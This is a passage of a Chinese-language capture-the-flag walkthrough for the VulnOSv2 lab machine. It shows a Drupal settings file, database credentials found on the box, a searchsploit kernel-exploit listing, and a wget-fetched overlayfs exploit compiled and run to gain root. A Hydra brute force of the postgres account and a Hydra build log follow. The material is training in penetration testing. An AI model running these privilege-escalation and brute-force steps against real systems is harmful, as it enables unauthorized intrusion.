 * with any backups of your Drupal files and database.
 *
 * Example:
 *   $drupal_hash_salt = file_get_contents('/home/example/salt.txt');
 *
 */
$drupal_hash_salt = '';

/**
 * Base URL (optional).
 *
 * If Drupal is generating incorrect URLs on your site, which could
 * be in HTML headers (links to CSS and JS files) or visible links on pages
 * (such as in menus), uncomment the Base URL statement below (remove the
 * leading hash sign) and fill in the absolute URL to your Drupal installation.
 *
 * You might also want to force users to use a given domain.
 * See the .htaccess file for more information.
 *
 * Examples:
 *   $base_url = 'http://www.example.com';
 *   $base_url = 'http://www.example.com:8888';
 *   $base_url = 'http://www.example.com/drupal';
 *   $base_url = 'https://www.example.com:8888/drupal';
 *
 * It is not allowed to have a trailing slash; Drupal will add it
 * for you.
 */
# $base_url = 'http://www.example.com';  // NO trailing slash!
if (file_exists('baseurl.php'))
	include_once('baseurl.php');

/**
 * Cron Key (optional).
 *
 * A cron key is generated at installation time to secure access to the cron.php
 * maintenance script. Debian package automatically executes the cron script for
 * each installed sites in drupal7. To complete setup a $cron_key variable must be
 * defined here or in a cronkey.php file.
 *
 * Example:
 *   $cron_key = '<cron_key>';
 *
 */
# $cron_key = '<cron_key>';

/**
 * PHP settings:
 *
 * To see what PHP settings are possible, including whether they can be set at
 * runtime (by using ini_set()), read the PHP documentation:
 * http://www.php.net/manual/en/ini.list.php
 * See drupal_initialize_variables() in includes/bootstrap.inc for required
 * runtime settings and the .htaccess file for non-runtime settings. Settings
 * defined there should not be duplicated here so as to avoid conflict issues.
 */

/**
 * Some distributions of Linux (most notably Debian) ship their PHP
 * installations with garbage collection (gc) disabled. Since Drupal depends on
 * PHP's garbage collection for clearing sessions, ensure that garbage
 * collection occurs by using the most common settings.
 */
ini_set('session.gc_probability', 1);
ini_set('session.gc_divisor', 100);

/**
 * Set session lifetime (in seconds), i.e. the time from the user's last visit
 * to the active session may be deleted by the session garbage collector. When
 * a session is deleted, authenticated users are logged out, and the contents
 * of the user's $_SESSION variable is discarded.
 */
ini_set('session.gc_maxlifetime', 200000);

/**
 * Set session cookie lifetime (in seconds), i.e. the time from the session is
 * created to the cookie expires, i.e. when the browser is expected to discard
 * the cookie. The value 0 means "until the browser is closed".
 */
ini_set('session.cookie_lifetime', 2000000);

/**
 * If you encounter a situation where users post a large amount of text, and
 * the result is stripped out upon viewing but can still be edited, Drupal's
 * output filter may not have sufficient memory to process it.  If you
 * experience this issue, you may wish to uncomment the following two lines
 * and increase the limits of these variables.  For more information, see
 * http://php.net/manual/en/pcre.configuration.php.
 */
# ini_set('pcre.backtrack_limit', 200000);
# ini_set('pcre.recursion_limit', 200000);

/**
 * Drupal automatically generates a unique session cookie name for each site
 * based on on its full domain name. If you have multiple domains pointing at
 * the same Drupal site, you can either redirect them all to a single domain
 * (see comment in .htaccess), or uncomment the line below and specify their
 * shared base domain. Doing so assures that users remain logged in as they
 * cross between your various domains.
 */
# $cookie_domain = 'example.com';

/**
 * Variable overrides:
 *
 * To override specific entries in the 'variable' table for this site,
 * set them here. You usually don't need to use this feature. This is
 * useful in a configuration file for a vhost or directory, rather than
 * the default settings.php. Any configuration setting from the 'variable'
 * table can be given a new value. Note that any values you provide in
 * these variable overrides will not be modifiable from the Drupal
 * administration interface.
 *
 * The following overrides are examples:
 * - site_name: Defines the site's name.
 * - theme_default: Defines the default theme for this site.
 * - anonymous: Defines the human-readable name of anonymous users.
 * Remove the leading hash signs to enable.
 */
# $conf['site_name'] = 'My Drupal site';
# $conf['theme_default'] = 'garland';
# $conf['anonymous'] = 'Visitor';

/**
 * A custom theme can be set for the offline page. This applies when the site
 * is explicitly set to maintenance mode through the administration page or when
 * the database is inactive due to an error. It can be set through the
 * 'maintenance_theme' key. The template file should also be copied into the
 * theme. It is located inside 'modules/system/maintenance-page.tpl.php'.
 * Note: This setting does not apply to installation and update pages.
 */
# $conf['maintenance_theme'] = 'bartik';

/**
 * Enable this setting to determine the correct IP address of the remote
 * client by examining information stored in the X-Forwarded-For headers.
 * X-Forwarded-For headers are a standard mechanism for identifying client
 * systems connecting through a reverse proxy server, such as Squid or
 * Pound. Reverse proxy servers are often used to enhance the performance
 * of heavily visited sites and may also provide other site caching,
 * security or encryption benefits. If this Drupal installation operates
 * behind a reverse proxy, this setting should be enabled so that correct
 * IP address information is captured in Drupal's session management,
 * logging, statistics and access management systems; if you are unsure
 * about this setting, do not have a reverse proxy, or Drupal operates in
 * a shared hosting environment, this setting should remain commented out.
 */
# $conf['reverse_proxy'] = TRUE;

/**
 * Set this value if your proxy server sends the client IP in a header other
 * than X-Forwarded-For.
 *
 * The "X-Forwarded-For" header is a comma+space separated list of IP addresses,
 * only the last one (the left-most) will be used.
 */
# $conf['reverse_proxy_header'] = 'HTTP_X_CLUSTER_CLIENT_IP';

/**
 * reverse_proxy accepts an array of IP addresses.
 *
 * Each element of this array is the IP address of any of your reverse
 * proxies. Filling this array Drupal will trust the information stored
 * in the X-Forwarded-For headers only if Remote IP address is one of
 * these, that is the request reaches the web server from one of your
 * reverse proxies. Otherwise, the client could directly connect to
 * your web server spoofing the X-Forwarded-For headers.
 */
# $conf['reverse_proxy_addresses'] = array('a.b.c.d', ...);

/**
 * Page caching:
 *
 * By default, Drupal sends a "Vary: Cookie" HTTP header for anonymous page
 * views. This tells a HTTP proxy that it may return a page from its local
 * cache without contacting the web server, if the user sends the same Cookie
 * header as the user who originally requested the cached page. Without "Vary:
 * Cookie", authenticated users would also be served the anonymous page from
 * the cache. If the site has mostly anonymous users except a few known
 * editors/administrators, the Vary header can be omitted. This allows for
 * better caching in HTTP proxies (including reverse proxies), i.e. even if
 * clients send different cookies, they still get content served from the cache
 * if aggressive caching is enabled and the minimum cache time is non-zero.
 * However, authenticated users should access the site directly (i.e. not use an
 * HTTP proxy, and bypass the reverse proxy if one is used) in order to avoid
 * getting cached pages from the proxy.
 */
# $conf['omit_vary_cookie'] = TRUE;

/**
 * CSS/JS aggregated file gzip compression:
 *
 * By default, when CSS or JS aggregation and clean URLs are enabled Drupal will
 * store a gzip compressed (.gz) copy of the aggregated files. If this file is
 * available then rewrite rules in the default .htaccess file will serve these
 * files to browsers that accept gzip encoded content. This allows pages to load
 * faster for these users and has minimal impact on server load. If you are
 * using a webserver other than Apache httpd, or a caching reverse proxy that is
 * configured to cache and compress these files itself you may want to uncomment
 * one or both of the below lines, which will prevent gzip files being stored.
 */
# $conf['css_gzip_compression'] = FALSE;
# $conf['js_gzip_compression'] = FALSE;

/**
 * String overrides:
 *
 * To override specific strings on your site with or without enabling locale
 * module, add an entry to this list. This functionality allows you to change
 * a small number of your site's default English language interface strings.
 *
 * Remove the leading hash signs to enable.
 */
# $conf['locale_custom_strings_en'][''] = array(
#   'forum'      => 'Discussion board',
#   '@count min' => '@count minutes',
# );

/**
 *
 * IP blocking:
 *
 * To bypass database queries for denied IP addresses, use this setting.
 * Drupal queries the {blocked_ips} table by default on every page request
 * for both authenticated and anonymous users. This allows the system to
 * block IP addresses from within the administrative interface and before any
 * modules are loaded. However on high traffic websites you may want to avoid
 * this query, allowing you to bypass database access altogether for anonymous
 * users under certain caching configurations.
 *
 * If using this setting, you will need to add back any IP addresses which
 * you may have blocked via the administrative interface. Each element of this
 * array represents a blocked IP address. Uncommenting the array and leaving it
 * empty will have the effect of disabling IP blocking on your site.
 *
 * Remove the leading hash signs to enable.
 */
# $conf['blocked_ips'] = array(
#   'a.b.c.d',
# );

/**
 * Authorized file system operations:
 *
 * The Update manager module included with Drupal provides a mechanism for
 * site administrators to securely install missing updates for the site
 * directly through the web user interface by providing either SSH or FTP
 * credentials. This allows the site to update the new files as the user who
 * owns all the Drupal files, instead of as the user the webserver is running
 * as. However, some sites might wish to disable this functionality, and only
 * update the code directly via SSH or FTP themselves. This setting completely
 * disables all functionality related to these authorized file operations.
 *
 * Remove the leading hash signs to disable.
 */
# $conf['allow_authorize_operations'] = FALSE;
```
</details>

得到第三个账号： drupal7/toor(mysql-->drupal7), 很不幸，不能登录：
```shell
webmin@VulnOSv2:/var/www/html/jabc/sites/default$ mysql -u drupal7@localhost -p
Enter password:
ERROR 1045 (28000): Access denied for user 'drupal7@localhost'@'localhost' (using password: YES)
webmin@VulnOSv2:~$ pwd
/home/webmin
webmin@VulnOSv2:~$ ls -al
total 596
drwxr-x--- 3 webmin webmin   4096 May  3  2016 .
drwxr-xr-x 4 root   root     4096 Apr 16  2016 ..
-rw------- 1 webmin webmin     85 May  4  2016 .bash_history
-rw-r--r-- 1 webmin webmin    220 Apr  9  2014 .bash_logout
-rw-r--r-- 1 webmin webmin   3637 Apr  9  2014 .bashrc
drwx------ 2 webmin webmin   4096 Apr 30  2016 .cache
-rw-rw-r-- 1 webmin webmin 579442 Apr 30  2016 post.tar.gz
-rw-r--r-- 1 webmin webmin    675 Apr  9  2014 .profile
webmin@VulnOSv2:~$ cat .bash_history
cd /home
cd vulnosadmin
ls -l
cd
ifconfig
exit
cd /home
cd vulnosadmin
ifconfig
exit
webmin@VulnOSv2:~$ ls -al /home/vulnosadmin
ls: cannot open directory /home/vulnosadmin: Permission denied
```

# 5. Post-Exploitation
这个部分主要是两种思路，一种是通过漏洞提权，一种是通过查找到具有root权限的账号信息，我比较暴力使用了第一种，然而更优雅的方式却是第二种方式。
## 5.1 linux内核漏洞提权
当我们拿到一个ssh的时候，尝试使用内核提权：
```shell
webmin@VulnOSv2:~/post$ uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux
webmin@VulnOSv2:~/post$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.4 LTS
Release:	14.04
Codename:	trusty
######
┌──(root㉿kali)-[/VulnOSv2]
└─# searchsploit linux kernel 3.13
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                                                           | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                                                                   | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                                                                          | linux/local/41995.c
Linux Kernel 3.13 - SGID Privilege Escalation                                                                                                                                       | linux/local/33824.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                                | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                                           | linux/local/37293.txt
Linux Kernel 3.13.1 - 'Recvmmsg' Local Privilege Escalation (Metasploit)                                                                                                            | linux/local/40503.rb
Linux Kernel 3.13/3.14 (Ubuntu) - 'splice()' System Call Local Denial of Service                                                                                                    | linux/dos/36743.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                                                                      | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                                                              | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                                                                     | linux/local/31346.c
Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)                                                                                                                               | linux/dos/31305.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                                                                | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                                                          | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                                                   | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                                                        | linux_x86-64/local/44302.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                                                                                                        | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                                                                        | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                                                   | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                                                                                             | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                                       | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service                                                                                                                                   | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                                                                                                            | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                                                                                                | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                                                                                                                      | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                              | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                                   | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                               | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                           | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)                                                                                                                                             | linux/dos/44301.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
#####
webmin@VulnOSv2:/tmp$ wget http://192.168.3.215/37292.c
--2022-07-31 17:00:25--  http://192.168.3.215/37292.c
Connecting to 192.168.3.215:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘37292.c’

100%[======================================>] 4,968       --.-K/s   in 0.01s

2022-07-31 17:00:25 (506 KB/s) - ‘37292.c’ saved [4968/4968]

webmin@VulnOSv2:/tmp$ chmod u+x 37292.c
webmin@VulnOSv2:/tmp$ gcc 37292.c -o exploit
webmin@VulnOSv2:/tmp$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
# whoami
root
```
## 5.2 postgres密码爆破
通过查看后台监听的端口及hydra文件猜测是要进行暴力破解，数据库postgres的默认用户名是postgres，因此尝试一下默认用户名爆破:postgres/postgres
```shell
webmin@VulnOSv2:~/post$ ./hydra -l postgres -e nsr postgres://localhost:5432
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-07-31 16:54:33
[DATA] max 3 tasks per 1 server, overall 64 tasks, 3 login tries (l:1/p:3), ~0 tries per task
[DATA] attacking service postgres on port 5432
[5432][postgres] host: localhost   login: postgres   password: postgres
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-07-31 16:54:34
```

## 5.3 vulnsadmin账号和密码(通过postgresql)

<details>
<summary>查看post.tar.gz</summary>
<pre>

```shell
webmin@VulnOSv2:~$ tar zxvf post.tar.gz
post/hydra-smb.c
post/xhydra.1
post/hydra-smtp.c
post/crc32.h
post/hydra-gtk/ChangeLog
post/hydra-gtk/README
post/hydra-gtk/COPYING
post/hydra-oracle-listener.c
post/pw-inspector.ico
post/crc32.c
post/hydra-gtk/make_xhydra.sh
post/hydra-sapr3.c
post/hydra-http-proxy-urlenum.c
post/hydra-gtk/src/Makefile.am
post/hydra-gtk/src/Makefile.in
post/hydra-wizard.sh
post/configure
post/hydra-gtk/INSTALL
post/rdp.h
post/hydra-gtk/src/
post/hydra-vnc.c
post/hydra-http-proxy.c
post/pw-inspector.1
post/ntlm.h
post/hydra-gtk/
post/Makefile.am
post/TODO
post/ntlm.c
post/hydra.1
post/hydra-gtk/configure.in
post/hydra-mssql.c
post/hydra-cvs.c
post/hydra-gtk/autogen.sh
post/hydra-ftp.c
post/hydra-xmpp.c
post/hydra-socks5.c
post/hydra-smtp-enum.c
post/hydra-gtk/xhydra.glade
post/hydra-cisco.c
post/hydra-sshkey.c
post/hydra-gtk/src/main.c
post/hydra-gtk/AUTHORS
post/hydra-gtk/config.h.in
post/hydra-gtk/src/interface.h
post/hydra-logo.rc
post/
post/pw-inspector-logo.rc
post/libpq-fe.h
post/hydra-gtk/src/interface.c
post/hydra-svn.c
post/hydra-vmauthd.c
post/bfg.h
post/hydra-imap.c
post/hydra-gtk/Makefile.in
post/hydra-gtk/NEWS
post/bfg.c
post/hydra-pcnfs.c
post/hydra-gtk/Makefile.am
post/hydra-http.c
post/hmacmd5.h
post/Android.mk
post/Makefile.orig
post/performance.h
post/hydra-snmp.c
post/hydra-http-form.c
post/hydra-gtk/src/support.h
post/hmacmd5.c
post/dpl4hydra_local.csv
post/hydra-firebird.c
post/d3des.h
post/hydra-icq.c
post/hydra-redis.c
post/hydra-pop3.c
post/d3des.c
post/hydra-asterisk.c
post/hydra-gtk/src/support.c
post/hydra-oracle-sid.c
post/postgres_ext.h
post/hydra-gtk/xhydra.gladep
post/Makefile
post/hydra-gtk/config.h
post/hydra-cisco-enable.c
post/hydra-gtk/stamp-h.in
post/dpl4hydra.sh
post/hydra-afp.c
post/LICENSE.OPENSSL
post/hydra-rdp.c
post/hydra-irc.c
post/hydra-mod.h
post/sasl.h
post/hydra-oracle.c
post/hydra-mod.c
post/sasl.c
post/hydra-gtk/aclocal.m4
post/hydra-rsh.c
post/CHANGES
post/LICENSE
post/Makefile.unix
post/hydra-gtk/configure
post/README
post/hydra-ldap.c
post/dpl4hydra_full.csv
post/hydra-nntp.c
post/hydra-mysql.c
post/hydra-rlogin.c
post/hydra-gtk/src/callbacks.c
post/hydra-s7-300.c
post/hydra-teamspeak.c
post/hydra-gtk/acconfig.h
post/hydra-gtk/missing
post/hydra-gtk/mkinstalldirs
post/hydra-logo.ico
post/hydra-gtk/src/callbacks.h
post/xhydra.jpg
post/hydra-pcanywhere.c
post/hydra-postgres.c
post/hydra-ssh.c
post/hydra-telnet.c
post/hydra-ncp.c
post/pw-inspector.c
post/hydra.h
post/hydra-rexec.c
post/hydra-gtk/install-sh
post/hydra-sip.c
post/hydra.c
post/INSTALL
webmin@VulnOSv2:~/post$ ./config
bash: ./config: No such file or directory
webmin@VulnOSv2:~/post$ ./configure

Starting hydra auto configuration ...
Detected 32 Bit Linux OS

Checking for openssl (libssl, libcrypto, ssl.h, sha.h) ...
                                                       ... found
Checking for idn (libidn.so) ...
                             ... found
Checking for curses (libcurses.so / term.h) ...
                                            ... NOT found, color output disabled
Checking for pcre (libpcre.so, pcre.h) ...
                                       ... NOT found, server response checks will be less reliable
Checking for Postgres (libpq.so, libpq-fe.h) ...
                                             ... found
Checking for SVN (libsvn_client-1 libapr-1.so libaprutil-1.so) ...
                                                               ... NOT found, module svn disabled
Checking for firebird (libfbclient.so) ...
                                       ... NOT found, module firebird disabled
Checking for MYSQL client (libmysqlclient.so, math.h) ...
                                                      ... NOT found, module Mysql will not support version > 4.x
Checking for AFP (libafpclient.so) ...
                                   ... NOT found, module Apple Filing Protocol disabled - Apple sucks anyway
Checking for NCP (libncp.so / nwcalls.h) ...
                                         ... NOT found, module NCP disabled
Checking for SAP/R3 (librfc/saprfc.h) ...
                                      ... NOT found, module sapr3 disabled
Get it from http://www.sap.com/solutions/netweaver/linux/eval/index.asp
Checking for libssh (libssh/libssh.h) ...
                                      ... NOT found, module ssh disabled
Get it from http://www.libssh.org
Checking for Oracle (libocci.so libclntsh.so / oci.h and libaio.so) ...
                                                                    ... NOT found, module Oracle disabled
Get basic and sdk package from http://www.oracle.com/technetwork/database/features/instant-client/index.html
Checking for GUI req's (pkg-config, gtk+-2.0) ...
                                              ... NOT found, optional anyway
Checking for Android specialities ...
                                  ... rindex() found
                                  ... RSA_generate_key() found
Checking for secure compile option support in gcc ...
                                                  Compiling... yes
                                                  Linking... yes

Hydra will be installed into .../bin of: /usr/local
  (change this by running ./configure --prefix=path)

Writing Makefile.in ...
now type "make"
webmin@VulnOSv2:~/post$ make
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro    -o pw-inspector  pw-inspector.c
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-vnc.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-pcnfs.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-rexec.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-nntp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-socks5.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-telnet.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-cisco.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-http.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-ftp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-imap.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-pop3.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-smb.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-icq.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-cisco-enable.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-ldap.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-mysql.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-mssql.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-xmpp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-http-proxy-urlenum.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-snmp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-cvs.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-smtp.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-smtp-enum.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-sapr3.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-ssh.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-sshkey.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-teamspeak.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-postgres.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-rsh.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-rlogin.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
gcc -I. -O3 -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro   -c hydra-oracle-listener.c -DLIBOPENSSL -DLIBIDN -DHAVE_PR29_H -DLIBPOSTGRES -DHAVE_MATH_H
